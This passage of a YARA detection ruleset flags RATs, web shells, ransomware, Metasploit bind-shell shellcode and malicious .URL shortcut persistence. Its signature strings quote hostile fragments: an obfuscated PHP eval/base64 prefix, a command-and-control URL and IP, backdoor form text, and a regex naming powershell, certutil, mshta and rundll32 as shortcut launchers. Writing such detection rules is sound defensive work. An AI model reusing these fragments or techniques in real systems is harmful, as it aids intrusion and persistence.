$opt97 = "SetForegroundWindow"
$opt98 = "SetUnhandledExceptionFilter"
$opt99 = "SetWindowLongA"
$opt100 = "SetWindowPos"
$opt101 = "ShowWindow"
$opt102 = "SizeofResource"
$opt103 = "TerminateProcess"
$opt104 = "TerminateThread"
$opt105 = "USER32.dll"
$opt106 = "UnhandledExceptionFilter"
$opt107 = "VERSION.dll"
$opt108 = "WaitForSingleObject"
$opt109 = "WritePrivateProfileStringA"
$opt110 = "Wscript.exe DS.vbs 8"
$opt111 = "advapi32.dll"
$opt112 = "advpack.dll"
$opt113 = "rundll32.exe %s,InstallHinfSection %s 128 %s"
$opt114 = "rundll32.exe %sadvpack.dll,DelNodeRunDLL32 \"%s\""
$opt115 = "setupapi.dll"
condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 200KB and filesize < 7000KB and all of ($req*) and 50 of ($opt*)
}
rule SSC_AutoGen_Win_Shell7d1943_TRJNx
{
meta:
author = "FileScan.IO Engine v1.1.0-de2de47"
date = "2023-03-10"
sample = "7d1943592ad97eef3c6b0add5e16e0055cf0a0586910c7ffcde7530be8058353"
score = 20
tags = "shell32.dll"
isWeakRule = true
strings:
//IOC patterns
$req0 = "<?xml version=\"1.0\" encoding=\"utf-8\" ?> \n<asmv1:assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:as"
//optional strings
$opt0 = "SetUnhandledExceptionFilter"
$opt1 = "ShellExecuteA"
$opt2 = "_controlfp"
$opt3 = "_environ"
$opt4 = "kernel32.dll"
$opt5 = "memset"
$opt6 = "msvcrt.dll"
$opt7 = "open powershell" nocase
$opt8 = "shell32.dll"
condition:
uint16(0) == 0x5A4D and filesize > 5530 and filesize < 6758 and all of ($req*) and all of ($opt*)
}
rule SSC_XScanBox_Malware_Generic_TRJNx {
meta:
description = "Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP"
author = "Florian Roth"
reference1 = "http://goo.gl/MUUfjv"
reference2 = "http://goo.gl/WXUQcP"
date = "2015/02/28"
hash1 = "8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9"
hash2 = "d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d"
hash3 = "3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2"
strings:
/* Sample 1 */
$s0 = "http://142.91.76.134/p.dat" fullword ascii
$s1 = "HttpDump 1.1" fullword ascii
/* Sample 2 */
$s3 = "SecureInput .exe" fullword wide
$s4 = "http://extcitrix.we11point.com/vpn/index.php?ref=1" fullword ascii
/* Sample 3 */
$s5 = "%SystemRoot%\\System32\\svchost.exe -k msupdate" fullword ascii
$s6 = "ServiceMaix" fullword ascii
/* Certificate and Keywords */
$x1 = "Management Support Team1" fullword ascii
$x2 = "DTOPTOOLZ Co.,Ltd.0" fullword ascii
$x3 = "SEOUL1" fullword ascii
condition:
( 1 of ($s*) and 2 of ($x*) ) or
( 3 of ($x*) )
}
rule SSC_small_php_php {
meta:
description = "Semi-Auto-generated  - file small.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "fcee6226d09d150bfa5f103bee61fbde"
strings:
$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
$s4 = "@ini_set('error_log',NULL);" fullword
condition:
2 of them
}
rule SSC_shellbot_pl {
meta:
description = "Semi-Auto-generated  - file shellbot.pl.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
strings:
$s0 = "ShellBOT"
$s1 = "PacktsGr0up"
$s2 = "CoRpOrAtIoN"
$s3 = "# Servidor de irc que vai ser usado "
$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
condition:
2 of them
}
rule SSC_fuckphpshell_php {
meta:
description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "554e50c1265bb0934fcc8247ec3b9052"
strings:
$s0 = "$succ = \"Warning! "
$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
$s2 = "\\*=-- MEMBERS AREA --=*/"
$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
condition:
2 of them
}
rule SSC_ngh_php_php {
meta:
description = "Semi-Auto-generated  - file ngh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "c372b725419cdfd3f8a6371cfeebc2fd"
strings:
$s0 = "Cr4sh_aka_RKL"
$s1 = "NGH edition"
$s2 = "/* connectback-backdoor on perl"
$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
condition:
1 of them
}
rule SSC_Tool_asp {
meta:
description = "Semi-Auto-generated  - file Tool.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
strings:
$s0 = "mailto:rhfactor@antisocial.com"
$s2 = "?raiz=root"
$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
condition:
2 of them
}
rule SSC_NT_Addy_asp {
meta:
description = "Semi-Auto-generated  - file NT Addy.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "2e0d1bae844c9a8e6e351297d77a1fec"
strings:
$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
$s4 = "RAW D.O.S. COMMAND INTERFACE"
condition:
1 of them
}
rule SSC_rst_sql_php_php {
meta:
description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "0961641a4ab2b8cb4d2beca593a92010"
strings:
$s0 = "C:\\tmp\\dump_"
$s1 = "RST MySQL"
$s2 = "http://rst.void.ru"
$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
condition:
2 of them
}
rule SSC_lurm_safemod_on_cgi {
meta:
description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "5ea4f901ce1abdf20870c214b3231db3"
strings:
$s0 = "Network security team :: CGI Shell" fullword
$s1 = "#########################<<KONEC>>#####################################" fullword
$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
condition:
1 of them
}
rule SSC_uploader_php_php {
meta:
description = "Semi-Auto-generated  - file uploader.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "0b53b67bb3b004a8681e1458dd1895d0"
strings:
$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
condition:
2 of them
}
rule SSC_telnet_pl {
meta:
description = "Semi-Auto-generated  - file telnet.pl.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "dd9dba14383064e219e29396e242c1ec"
strings:
$s0 = "W A R N I N G: Private Server"
$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "
condition:
all of them
}
rule SSC_w3d_php_php {
meta:
description = "Semi-Auto-generated  - file w3d.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "987f66b29bfb209a0b4f097f84f57c3b"
strings:
$s0 = "W3D Shell"
$s1 = "By: Warpboy"
$s2 = "No Query Executed"
condition:
2 of them
}
rule SSC_DownExecute_A
{
meta:
Author      = "PwC Cyber Threat Operations :: @tlansec"
Date        = "2015/04/27"
Description = "Malware is often wrapped/protected, best to run on memory"
Reference   = "http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html"
strings:
$winver1 = "win 8.1"
$winver2 = "win Server 2012 R2"
$winver3 = "win Srv 2012"
$winver4 = "win srv 2008 R2"
$winver5 = "win srv 2008"
$winver6 = "win vsta"
$winver7 = "win srv 2003 R2"
$winver8 = "win hm srv"
$winver9 = "win Strg srv 2003"
$winver10 = "win srv 2003"
$winver11 = "win XP prof x64 edt"
$winver12 = "win XP"
$winver13 = "win 2000"
$pdb1 = "D:\\Acms\\2\\docs\\Visual Studio 2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb"
$pdb2 = "d:\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h"
$pdb3 = ":\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal/stack.h"
$pdb4 = "\\downloadexcute\\downexecute\\"
$magic1 = "<Win Get Version Info Name Error"
$magic2 = "P@$sw0rd$nd"
$magic3 = "$t@k0v2rF10w"
$magic4 = "|*|123xXx(Mutex)xXx321|*|6-21-2014-03:06PM" wide
$str1 = "Download Excute" ascii wide fullword
$str2 = "EncryptorFunctionPointer %d"
$str3 = "%s\\%s.lnk"
$str4 = "Mac:%s-Cpu:%s-HD:%s"
$str5 = "feed back responce of host"
$str6 = "GET Token at host"
$str7 = "dwn md5 err"
condition:
all of ($winver*) or any of ($pdb*) or any of ($magic*) or 2 of ($str*)
}
rule SSC_Bozok
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Bozok"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "getVer" nocase
$b = "StartVNC" nocase
$c = "SendCamList" nocase
$d = "untPlugin" nocase
$e = "gethostbyname" nocase
condition:
all of them
}
rule SSC_CyberGate
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/CyberGate"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
$string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
$string3 = "EditSvr"
$string4 = "TLoader"
$string5 = "Stroks"
$string6 = "####@####"
$res1 = "XX-XX-XX-XX"
$res2 = "CG-CG-CG-CG"
condition:
all of ($string*) and any of ($res*)
}
rule SSC_DarkRAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/DarkRAT"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "@1906dark1996coder@"
$b = "SHEmptyRecycleBinA"
$c = "mciSendStringA"
$d = "add_Shutdown"
$e = "get_SaveMySettingsOnExit"
$f = "get_SpecialDirectories"
$g = "Client.My"
condition:
all of them
}
rule SSC_Greame
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Greame"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
$b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
$c = "EditSvr"
$d = "TLoader"
$e = "Stroks"
$f = "Avenger by NhT"
$g = "####@####"
$h = "GREAME"
condition:
all of them
}
rule SSC_LostDoor
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/LostDoor"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}
$a1 = "*mlt* = %"
$a2 = "*ip* = %"
$a3 = "*victimo* = %"
$a4 = "*name* = %"
$b5 = "[START]"
$b6 = "[DATA]"
$b7 = "We Control Your Digital World" wide ascii
$b8 = "RC4Initialize" wide ascii
$b9 = "RC4Decrypt" wide ascii
condition:
all of ($a*) or all of ($b*)
}
rule SSC_LuxNet
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/LuxNet"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "GetHashCode"
$b = "Activator"
$c = "WebClient"
$d = "op_Equality"
$e = "dickcursor.cur" wide
$f = "{0}|{1}|{2}" wide
condition:
all of them
}
rule SSC_Pandora
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Pandora"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "Can't get the Windows version"
$b = "=M=Q=U=Y=]=a=e=i=m=q=u=y=}="
$c = "JPEG error #%d" wide
$d = "Cannot assign a %s to a %s" wide
$g = "%s, ProgID:"
$h = "clave"
$i = "Shell_TrayWnd"
$j = "melt.bat"
$k = "\\StubPath"
$l = "\\logs.dat"
$m = "1027|Operation has been canceled!"
$n = "466|You need to plug-in! Double click to install... |"
$0 = "33|[Keylogger Not Activated!]"
condition:
all of them
}
rule SSC_Paradox
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Paradox"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "ParadoxRAT"
$b = "Form1"
$c = "StartRMCam"
$d = "Flooders"
$e = "SlowLaris"
$f = "SHITEMID"
$g = "set_Remote_Chat"
condition:
all of them
}
rule SSC_Punisher
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Punisher"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "abccba"
$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}
$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}
$d = "SpyTheSpy" wide ascii
$e = "wireshark" wide
$f = "apateDNS" wide
$g = "abccbaDanabccb"
condition:
all of them
}
rule SSC_SmallNet
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/SmallNet"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$split1 = "!!<3SAFIA<3!!"
$split2 = "!!ElMattadorDz!!"
$a1 = "stub_2.Properties"
$a2 = "stub.exe" wide
$a3 = "get_CurrentDomain"
condition:
($split1 or $split2) and (all of ($a*))
}
rule SSC_Suspicious_Shortcut_Local_URL
{
meta:
author = "@itsreallynick (Nick Carr), @QW5kcmV3 (Andrew Thompson)"
description = "Detects local script usage for .URL persistence"
reference = "https://twitter.com/cglyer/status/1176184798248919044"
score = 50
date = "27.09.2019"
strings:
$file = "URL=file:///" nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
$file and any of ($url*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_Suspicious_Shortcut_SMB_URL
{
meta:
author = "@itsreallynick (Nick Carr), @QW5kcmV3 (Andrew Thompson)"
description = "Detects remote SMB path for .URL persistence"
reference = "https://twitter.com/cglyer/status/1176184798248919044"
sample = "e0bef7497fcb284edb0c65b59d511830"
score = 50
date = "27.09.2019"
strings:
$file = /URL=file:\/\/[a-z0-9]/ nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
$file and any of ($url*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_Suspicious_Shortcut_IconRemote_SMBorLocal
{
meta:
author = "@itsreallynick (Nick Carr)"
description = "This is the syntax used for NTLM hash stealing via Responder - https://www.securify.nl/nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html"
reference = "https://twitter.com/ItsReallyNick/status/1176241449148588032"
score = 50
date = "27.09.2019"
strings:
$icon = "IconFile=file://" nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
$icon and any of ($url*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_Suspicious_Shortcut_LOLcommand
{
meta:
author = "@itsreallynick (Nick Carr)"
reference = "https://twitter.com/ItsReallyNick/status/1176601500069576704"
description = "Detects possible shortcut usage for .URL persistence"
score = 50
date = "27.09.2019"
modified = "2021-02-14"
strings:
$file1 = /[\x0a\x0d](IconFile|(Base|)URL)\s*=[^\x0d]*(powershell|cmd|certutil|mshta|wscript|cscript|rundll32|wmic|regsvr32|msbuild)(\.exe|)[^\x0d]{2,50}\x0d/ nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
any of ($url*) and any of ($file*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_Suspicious_Shortcut_ScriptURL
{
meta:
author = "@itsreallynick (Nick Carr)"
description = "Detects possible shortcut usage for .URL persistence"
reference = "https://twitter.com/cglyer/status/1176184798248919044"
score = 50
date = "27.09.2019"
strings:
$file1 = /[\x0a\x0d](IconFile|(Base|)URL)\s*=[^\x0d]*script:/ nocase
//    $file2 = /IconFile=script:/ nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
any of ($url*) and any of ($file*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_Methodology_Suspicious_Shortcut_WorkingDirRemote_HTTP
{
meta:
author = "@itsreallynick (Nick Carr)"
description = "Detects possible shortcut usage for .URL persistence"
reference = "https://twitter.com/cglyer/status/1176184798248919044"
score = 50
date = "27.09.2019"
strings:
$icon = "WorkingDirectory=http" nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
$icon and any of ($url*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_Methodology_Suspicious_Shortcut_WorkingDirRemote_SMB
{
meta:
author = "@itsreallynick (Nick Carr)"
description = "Detects possible shortcut usage for .URL persistence"
reference = "https://twitter.com/cglyer/status/1176184798248919044"
score = 50
date = "27.09.2019"
strings:
$icon = "WorkingDirectory=file://" nocase
$url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
$url_explicit = "[InternetShortcut]" nocase
condition:
$icon and any of ($url*)
and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
and filesize < 30KB
}
rule SSC_AutoGen_Win_WinLock_e9cef52b_RansomX
{
meta:
author = "FileScan.IO Engine v1.1.0-39a6d2b"
date = "2023-03-14"
sample = "e9cef52bf082c87766bbac0b3324c3d76e66e9d5b943e751a04583dc041a0273"
score = 50
tags = "packed,shell32.dll"
isWeakRule = true
strings:
//IOC patterns
$req0 = "1301652772272D1FE7E446C822DE858F(BAD775677AA1720F426F3888512D64886B7C99D5\nCA0BC4467F FF58C573EE53E3D78775484D711C7E3F" nocase
//optional strings
$opt0 = "COMCTL32.DLL"
$opt1 = "CoInitialize"
$opt2 = "ExitProcess"
$opt3 = "GetProcAddress"
$opt4 = "KERNEL32.DLL"
$opt5 = "LoadLibraryA"
$opt6 = "MSVCRT.dll"
$opt7 = "SHELL32.DLL"
$opt8 = "SHLWAPI.DLL"
$opt9 = "ShellExecuteExW"
$opt10 = "USER32.DLL"
$opt11 = "VirtualProtect"
condition:
//require 75% of optional strings
uint16(0) == 0x5A4D and filesize > 10KB and filesize < 9999KB and all of ($req*) and 8 of ($opt*)
}
rule SSC_AutoGen_Win_SHBORNESHA_db307d31_TRJNx
{
meta:
author = "FileScan.IO Engine v1.1.0-1bfda3b"
date = "2023-03-07"
sample = "db307d31bbb3d282685bf28e0abf464a931fa749633d784e39adbe7d8d8ead31"
score = 50
tags = "greyware,overlay,packed,setupapi.dll,shdocvw.dll,shell32.dll"
isWeakRule = true
strings:
//IOC patterns
$req0 = "SOFTWARE\\Borland\\Delphi\\RTL"
$req1 = "Software\\Microsoft\\Windows\\CurrentVersion"
$req2 = "deee3d3f0}\"/>\r\n    <!--The ID below indicates application support for Windows 7 -->\r\n      <supportedOS Id=\"{35138b9a-5d96-4fbd-"
//optional strings
$opt0 = "ADVAPI32.dll"
$opt1 = "AcquireSRWLockExclusive"
$opt2 = "AdjustTokenPrivileges"
$opt3 = "AllocConsole"
$opt4 = "AttachConsole"
$opt5 = "CLSIDFromString"
$opt6 = "COMCTL32.dll"
$opt7 = "COMDLG32.dll"
$opt8 = "CoCreateInstance"
$opt9 = "CreateDirectoryA"
$opt10 = "CreateDirectoryW"
$opt11 = "CreateEventW"
$opt12 = "CreateFileA"
$opt13 = "CreateFileMappingW"
$opt14 = "CreateFileW"
$opt15 = "CreateHardLinkW"
$opt16 = "CreateMutexA"
$opt17 = "CreateSemaphoreW"
$opt18 = "CreateThread"
$opt19 = "CreateThread failed"
$opt20 = "CreateWindowExW"
$opt21 = "Crypt32.dll"
$opt22 = "CryptProtectMemory"
$opt23 = "CryptProtectMemory failed"
$opt24 = "CryptUnprotectMemory"
$opt25 = "CryptUnprotectMemory failed"
$opt26 = "DecodePointer"
$opt27 = "DefWindowProcW"
$opt28 = "DeleteCriticalSection"
$opt29 = "DeleteFileA"
$opt30 = "DeleteFileW"
$opt31 = "DestroyIcon"
$opt32 = "DestroyWindow"
$opt33 = "DeviceIoControl"
$opt34 = "DispatchMessageW"
$opt35 = "EnableWindow"
$opt36 = "EncodePointer"
$opt37 = "EnterCriticalSection"
$opt38 = "EventRegister"
$opt39 = "EventSetInformation"
$opt40 = "EventUnregister"
$opt41 = "EventWriteTransfer"
$opt42 = "ExitProcess"
$opt43 = "ExpandEnvironmentStringsW"
$opt44 = "ExtractIconA"
$opt45 = "FileTimeToLocalFileTime"
$opt46 = "FileTimeToSystemTime"
$opt47 = "FindFirstFileA"
$opt48 = "FindFirstFileExA"
$opt49 = "FindFirstFileW"
$opt50 = "FindNextFileA"
$opt51 = "FindNextFileW"
$opt52 = "FindResourceW"
$opt53 = "FindWindowExW"
$opt54 = "FlushFileBuffers"
$opt55 = "FreeConsole"
$opt56 = "FreeEnvironmentStringsW"
$opt57 = "FreeLibrary"
$opt58 = "GetCommandLineA"
$opt59 = "GetCommandLineW"
$opt60 = "GetConsoleCP"
$opt61 = "GetConsoleMode"
$opt62 = "GetCurrentDirectoryW"
$opt63 = "GetCurrentPackageId"
$opt64 = "GetCurrentProcess"
$opt65 = "GetCurrentProcessId"
$opt66 = "GetCurrentThreadId"
$opt67 = "GetDateFormatW"
$opt68 = "GetDriveTypeA"
$opt69 = "GetEnvironmentStringsW"
$opt70 = "GetExitCodeProcess"
$opt71 = "GetFileAttributesA"
$opt72 = "GetFileAttributesW"
$opt73 = "GetFileSize"
$opt74 = "GetFileType"
$opt75 = "GetFullPathNameW"
$opt76 = "GetKeyboardType"
$opt77 = "GetLastError"
$opt78 = "GetLocalTime"
$opt79 = "GetLocaleInfoA"
$opt80 = "GetLocaleInfoW"
$opt81 = "GetLogicalDriveStringsA"
$opt82 = "GetMessageW"
$opt83 = "GetModuleFileNameA"
$opt84 = "GetModuleFileNameW"
$opt85 = "GetModuleHandleA"
$opt86 = "GetModuleHandleExW"
$opt87 = "GetModuleHandleW"
$opt88 = "GetProcAddress"
$opt89 = "GetProcessAffinityMask"
$opt90 = "GetProcessHeap"
$opt91 = "GetShortPathNameA"
$opt92 = "GetShortPathNameW"
$opt93 = "GetStartupInfoA"
$opt94 = "GetStartupInfoW"
$opt95 = "GetStdHandle"
$opt96 = "GetStringTypeW"
$opt97 = "GetSystemDirectoryW"
$opt98 = "GetSystemInfo"
$opt99 = "GetSystemMetrics"
$opt100 = "GetSystemTime"
$opt101 = "GetSystemTimeAsFileTime"
$opt102 = "GetTempPathA"
$opt103 = "GetTempPathW"
$opt104 = "GetThreadLocale"
$opt105 = "GetTickCount"
$opt106 = "GetTimeFormatW"
$opt107 = "GetVersion"
$opt108 = "GetVersionExW"
$opt109 = "GetWindowLongW"
$opt110 = "GetWindowTextW"
$opt111 = "GetWindowsDirectoryA"
$opt112 = "GlobalAlloc"
$opt113 = "HeapReAlloc"
$opt114 = "InitializeCriticalSection"
$opt115 = "InitializeCriticalSectionAndSpinCount"
$opt116 = "InitializeCriticalSectionEx"
$opt117 = "InitializeSListHead"
$opt118 = "IsDebuggerPresent"
$opt119 = "IsProcessorFeaturePresent"
$opt120 = "IsWindowVisible"
$opt121 = "KERNEL32.DLL"
$opt122 = "KERNEL32.dll"
$opt123 = "LCMapStringW"
$opt124 = "LeaveCriticalSection"
$opt125 = "LoadCursorW"
$opt126 = "LoadLibraryExA"
$opt127 = "LoadLibraryExW"
$opt128 = "LoadLibraryW"
$opt129 = "LoadStringW"
$opt130 = "LocalAlloc"
$opt131 = "LocalFileTimeToFileTime"
$opt132 = "LookupPrivilegeValueW"
$opt133 = "MapViewOfFile"
$opt134 = "MoveFileExW"
$opt135 = "OleInitialize"
$opt136 = "OleUninitialize"
$opt137 = "OpenFileMappingW"
$opt138 = "OpenProcessToken"
$opt139 = "PeekMessageW"
$opt140 = "PostMessageW"
$opt141 = "QueryPerformanceCounter"
$opt142 = "QueryPerformanceFrequency"
$opt143 = "RaiseException"
$opt144 = "RegCloseKey"
$opt145 = "RegCreateKeyExW"
$opt146 = "RegOpenKeyExA"
$opt147 = "RegOpenKeyExW"
$opt148 = "RegQueryValueExA"
$opt149 = "RegQueryValueExW"
$opt150 = "RegSetValueExA"
$opt151 = "RegSetValueExW"
$opt152 = "RegisterClassExW"
$opt153 = "ReleaseMutex"
$opt154 = "ReleaseSRWLockExclusive"
$opt155 = "ReleaseSemaphore"
$opt156 = "RemoveDirectoryW"
$opt157 = "ResetEvent"
$opt158 = "SHAutoComplete"
$opt159 = "SHBrowseForFolderW"
$opt160 = "SHChangeNotify"
$opt161 = "SHELL32.dll"
$opt162 = "SHFileOperationW"
$opt163 = "SHGetFileInfoW"
$opt164 = "SHGetFolderLocation"
$opt165 = "SHGetMalloc"
$opt166 = "SHGetPathFromIDListW"
$opt167 = "SHLWAPI.dll"
$opt168 = "SSPICLI.DLL"
$opt169 = "SendMessageW"
$opt170 = "SetCurrentDirectoryA"
$opt171 = "SetCurrentDirectoryW"
$opt172 = "SetDefaultDllDirectories"
$opt173 = "SetDllDirectoryW"
$opt174 = "SetEndOfFile"
$opt175 = "SetEnvironmentVariableW"
$opt176 = "SetFileAttributesA"
$opt177 = "SetFileAttributesW"
$opt178 = "SetFilePointer"
$opt179 = "SetFilePointerEx"
$opt180 = "SetFileSecurityW"
$opt181 = "SetFileTime"
$opt182 = "SetForegroundWindow"
$opt183 = "SetLastError"
$opt184 = "SetStdHandle"
$opt185 = "SetThreadExecutionState"
$opt186 = "SetThreadPriority"
$opt187 = "SetUnhandledExceptionFilter"
$opt188 = "SetWindowLongW"
$opt189 = "SetWindowPos"
$opt190 = "ShellExecuteA"
$opt191 = "ShellExecuteExW"
$opt192 = "ShowWindow"
$opt193 = "SysFreeString"
$opt194 = "SysReAllocStringLen"
$opt195 = "SystemFunction036"
condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 1000KB and filesize < 50000KB and all of ($req*) and 90 of ($opt*)
}
rule SSC_metasploit_bind_shell {
meta:
author = "FDD @ Cuckoo Sandbox"
description = "Rule for metasploit's bind shell shellcode"
name = "Metasploit bind shell payload"
strings:
$s1 = { fce8 8?00 0000 60 }     // shellcode prologe in metasploit
$s2 = { 648b ??30 }             // mov edx, fs:[???+0x30]
$s3 = { 4c77 2607 }             // checksum for LoadLibraryA
$s4 = { 2980 6b00 }             // checksum for WSAStartup
$s5 = { ea0f dfe0 }             // checksum for WSASocketA
$s6 = { c2db 3767 }             // checksum for bind
$s7 = { b7e9 38ff }             // checksum for listen
$s8 = { 74ec 3be1 }             // checksum for accept
condition:
all of them and filesize < 5KB
}
rule SSC_CobLatX_FuncX
{
strings:
$s1 = { 58 A4 53 E5 }
$s3 = { 4C 77 26 07 }
$magic = { 4D 5A }
condition:
$magic at 0 and all of them and filesize > 10KB and filesize < 9999KB
}
rule SSC_NanoCoreByName
{
meta:
author = "@neonprimetime"
description = "NanoCore"
